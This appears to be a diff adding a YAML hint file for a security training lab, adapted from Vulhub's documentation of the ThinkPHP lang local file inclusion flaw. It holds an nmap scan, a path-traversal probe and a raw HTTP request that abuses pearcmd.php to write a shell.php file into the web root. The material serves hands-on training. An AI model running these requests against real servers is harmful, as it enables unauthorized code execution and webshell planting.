@@ -1,0 +1,117 @@
+# Optional ScenarioForge guide hints; derived from the adjacent public Vulhub documentation.
+schema_version: 1
+match: thinkphp/lang-rce
+hint_levels:
+  low:
+  - Inspect the thinkphp service or application on {{NODE_NAME}} @ {{NODE_IP}}.
+  medium:
+  - |-
+    Catalog TCP ports: 8080. Identify the exposed services:
+
+    ```bash
+    nmap -Pn -sT -sV -p 8080 {{NODE_IP}}
+    ```
+  - 'Catalog port mappings (published → container): web: 8080/tcp → container 80/tcp. These are recipe defaults;
+    use the deployed service port if the scenario remaps it.'
+  - 'Documented target URL(s): `http://{{NODE_IP}}:8080`.'
+  high:
+  - 'Vulnerability: ThinkPHP Lang Local File Inclusion.'
+  - Send the raw request examples with an HTTP client that recalculates Content-Length after target and payload
+    substitutions.
+  - |-
+    Exploit
+
+    Firstly, because the multiple language feature is not enabled by default, you can try to include the `public/index.php` to determine whether the vulnerability exists:
+
+    ```
+    http://{{NODE_IP}}:8080/?lang=../../../../../public/index
+    ```
+
+    Documentation illustration: https://github.com/vulhub/vulhub/blob/3af973a39bd0988f288a53fa9ea4b82372774e58/thinkphp/lang-rce/1.png
+
+    The vulnerability exists if the server crashed and a 500 error response comes back.
+
+    Then, try to write data through "/usr/local/lib/php/pearcmd.php":
+
+    ```
+    GET /?+config-create+/&lang=../../../../../../../../../../../usr/local/lib/php/pearcmd&/<?=phpinfo()?>+shell.php HTTP/1.1
+    Host: {{NODE_IP}}:8080
+    Accept-Encoding: gzip, deflate
+    Accept: */*
+    Accept-Language: en-US;q=0.9,en;q=0.8
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.5249.62 Safari/537.36
+    Connection: close
+    Cache-Control: max-age=0
+
+
+    ```
+
+    If the server response the output of pearcmd, which means the exploit is successful:
+
+    Documentation illustration: https://github.com/vulhub/vulhub/blob/3af973a39bd0988f288a53fa9ea4b82372774e58/thinkphp/lang-rce/2.png
+
+    As you can see, the `shell.php` is written in root directory of web:
+
+    Documentation illustration: https://github.com/vulhub/vulhub/blob/3af973a39bd0988f288a53fa9ea4b82372774e58/thinkphp/lang-rce/3.png
+  - 'Publicly available documentation: https://github.com/vulhub/vulhub/blob/3af973a39bd0988f288a53fa9ea4b82372774e58/thinkphp/lang-rce/README.md'
+  - |-
+    Additional public references:
+    - https://tttang.com/archive/1865/
+    - https://www.leavesongs.com/PENETRATION/docker-php-include-getshell.html#0x06-pearcmdphp
+access_instructions:
+  title: ThinkPHP Lang Local File Inclusion
+  steps:
+  - title: Locate the target service
+    instructions: |-
+      Catalog TCP ports: 8080. Identify the exposed services:
+
+      ```bash
+      nmap -Pn -sT -sV -p 8080 {{NODE_IP}}
+      ```
+
+      Catalog port mappings (published → container): web: 8080/tcp → container 80/tcp. These are recipe defaults; use the deployed service port if the scenario remaps it.
+
+      Documented target URL(s): `http://{{NODE_IP}}:8080`.
+  - title: Exploit
+    instructions: |-
+      Firstly, because the multiple language feature is not enabled by default, you can try to include the `public/index.php` to determine whether the vulnerability exists:
+
+      ```
+      http://{{NODE_IP}}:8080/?lang=../../../../../public/index
+      ```
+
+      Documentation illustration: https://github.com/vulhub/vulhub/blob/3af973a39bd0988f288a53fa9ea4b82372774e58/thinkphp/lang-rce/1.png
+
+      The vulnerability exists if the server crashed and a 500 error response comes back.
+
+      Then, try to write data through "/usr/local/lib/php/pearcmd.php":
+
+      ```
+      GET /?+config-create+/&lang=../../../../../../../../../../../usr/local/lib/php/pearcmd&/<?=phpinfo()?>+shell.php HTTP/1.1
+      Host: {{NODE_IP}}:8080
+      Accept-Encoding: gzip, deflate
+      Accept: */*
+      Accept-Language: en-US;q=0.9,en;q=0.8
+      User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.5249.62 Safari/537.36
+      Connection: close
+      Cache-Control: max-age=0
+
+
+      ```
+
+      If the server response the output of pearcmd, which means the exploit is successful:
+
+      Documentation illustration: https://github.com/vulhub/vulhub/blob/3af973a39bd0988f288a53fa9ea4b82372774e58/thinkphp/lang-rce/2.png
+
+      As you can see, the `shell.php` is written in root directory of web:
+
+      Documentation illustration: https://github.com/vulhub/vulhub/blob/3af973a39bd0988f288a53fa9ea4b82372774e58/thinkphp/lang-rce/3.png
+guidance_source:
+  repository: https://github.com/vulhub/vulhub
+  snapshot_commit: 3af973a39bd0988f288a53fa9ea4b82372774e58
+  documentation_url: https://github.com/vulhub/vulhub/blob/3af973a39bd0988f288a53fa9ea4b82372774e58/thinkphp/lang-rce/README.md
+  readme_sha256: fc39174dffced712bbb2665133d9baca9a0f7ad0cbf1a9b657c5602309235c8a
+  compose_sha256: 316fd857d6c96c12561ba17ceed169e6a29d7f962949c62e589ac75572baad99
+  license: MIT; see vulnhub/content/LICENSE
+  method: Tiered discovery hints and adapted reproduction text from the local catalog snapshot. Reproduction commands
+    have not been executed.
